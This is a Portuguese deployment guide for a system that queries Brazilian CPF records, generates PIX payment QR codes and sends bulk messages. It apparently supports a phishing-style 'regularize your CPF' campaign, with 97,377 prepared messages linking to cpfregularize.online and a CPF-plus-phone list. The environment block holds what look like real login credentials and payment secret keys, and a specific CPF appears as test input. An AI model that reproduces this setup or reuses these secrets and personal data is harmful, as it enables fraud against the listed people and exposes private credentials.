# 🚀 Instruções de Deploy

## ⚠️ Configuração Necessária para Deploy em Produção

### 1. Instalar Playwright após Deploy

O sistema usa **Playwright** para consultar o Yan Buscas. Após fazer o deploy, execute:

```bash
playwright install chromium --with-deps
```

### 2. Variáveis de Ambiente Necessárias

Certifique-se de que as seguintes variáveis estão configuradas:

```bash
# Yan Buscas (Consulta de CPF)
YANBUSCAS_USER=joapedrs
YANBUSCAS_PASS=jp1012

# Furia Pay (Pagamento PIX)
FURIAPAY_PUBLIC_KEY=pk_KynpL7l3H-Qf-AsQw0FzSx1OR1kEoLYfvj_XBfwra6AUd0Ox
FURIAPAY_SECRET_KEY=sk_SWWj5eNt9JGj_Dv67Y_JDcgCDJZI-Sq5yT-her0gqNeFykZl

# MongoDB (fornecido pela plataforma)
MONGO_URL=<fornecido_pelo_emergent>
DB_NAME=<fornecido_pelo_emergent>
```

### 3. Arquivos de Dados

Os seguintes arquivos precisam estar presentes no servidor:

- `/app/mensagens_3000_PRONTO.xlsx` - 3.000 mensagens com link incluído
- `/app/mensagens_completo_97k.xlsx` - 97.377 mensagens completas
- `/app/cpf_telefone_consolidado.txt` - Lista CPF + Telefone

### 4. Dependências Python

Certifique-se de que todas as dependências estão instaladas:

```bash
pip install -r requirements.txt
playwright install chromium
```

### 5. Testar Após Deploy

Após o deploy, teste:

1. **Consulta de CPF:** Acesse o site e teste com CPF `103.621.989-50`
2. **Geração de PIX:** Complete o fluxo até a página de pagamento
3. **Dashboard:** Acesse `/dashboard` e teste os downloads

### 6. Troubleshooting

**Se o Playwright não funcionar:**
- Verifique se o Chromium foi instalado: `playwright install chromium`
- Verifique os logs: `tail -f /var/log/supervisor/backend.err.log`
- Verifique as variáveis de ambiente

**Se o PIX não gerar:**
- Verifique as chaves do Furia Pay no arquivo `.env`
- Teste a API diretamente: `curl -X POST /api/pix/gerar ...`

---

## 📊 Estatísticas do Sistema

- **Mensagens disponíveis:** 97.377
- **Base de 3.000:** Arquivo pronto com link https://cpfregularize.online
- **Integração Yan Buscas:** Consulta real de dados de CPF
- **Integração Furia Pay:** Geração real de QR Code PIX
